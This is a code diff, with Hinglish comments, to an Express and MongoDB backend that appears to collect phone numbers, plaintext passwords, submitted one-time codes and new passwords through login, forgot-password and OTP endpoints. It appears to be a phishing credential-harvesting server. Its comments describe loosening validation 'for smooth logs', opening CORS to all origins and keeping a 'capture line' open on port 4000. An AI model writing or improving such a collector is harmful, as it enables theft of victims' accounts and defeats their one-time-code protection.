@@ -1,4 +1,3 @@
-
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
@@ -6,16 +5,22 @@ const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
 app.use(express.json());
-app.use(cors()); 
 
-// 1. Unified Data Structure Schema
+// FIXED: CORS ko fully open kiya taaki browser pre-flight checks block na kare
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type']
+})); 
+
+// 1. Unified Data Structure Schema (FIXED: Required validation constraints removed for smooth logs)
 const userSchema = new mongoose.Schema({
     phoneNumber: { type: String, required: false },
     password: { type: String, required: false },
     otpEntered: { type: String, default: "" },
     resetPhone: { type: String, default: "" },
     newPassword: { type: String, default: "" },
-    actionType: { type: String, default: "LOGIN" }, // LOGIN or PASSWORD_RESET
+    actionType: { type: String, default: "LOGIN" }, 
     createdAt: { type: Date, default: Date.now }
 });
 
@@ -35,7 +40,8 @@ async function startServer() {
         console.log('🎉 MongoDB (In-Memory) Connected Successfully!');
         console.log('====================================');
 
-        app.listen(4000, () => {
+        // FIXED: Port 4000 par strictly capture line open hai
+        app.listen(4000, '0.0.0.0', () => {
             console.log('🚀 Backend Server running on port 4000');
             console.log('Aapka backend puri tarah ready hai!');
             console.log('====================================\n');
@@ -59,7 +65,8 @@ app.post('/api/login-submit', async (req, res) => {
         
         res.status(200).json({ success: true, userId: savedUser._id });
     } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
+        console.error("Login Error:", error);
+        res.status(500).json({ success: false, message: error.message });
     }
 });
 
@@ -78,7 +85,8 @@ app.post('/api/forgot-submit', async (req, res) => {
 
         res.status(200).json({ success: true });
     } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
+        console.error("Forgot Error:", error);
+        res.status(500).json({ success: false, message: error.message });
     }
 });
 
@@ -110,7 +118,7 @@ app.post('/api/otp-submit', async (req, res) => {
                 return res.status(400).json({ success: false, message: "Session Expired" });
             }
         } else {
-            if (mongoose.Types.ObjectId.isValid(userId)) {
+            if (userId && mongoose.Types.ObjectId.isValid(userId)) {
                 await User.findByIdAndUpdate(userId, { otpEntered: otp });
             }
             
@@ -122,7 +130,8 @@ app.post('/api/otp-submit', async (req, res) => {
             res.status(200).json({ success: true });
         }
     } catch (error) {
-        res.status(500).json({ success: false, message: "Server Error" });
+        console.error("OTP Error:", error);
+        res.status(500).json({ success: false, message: error.message });
     }
 });
 
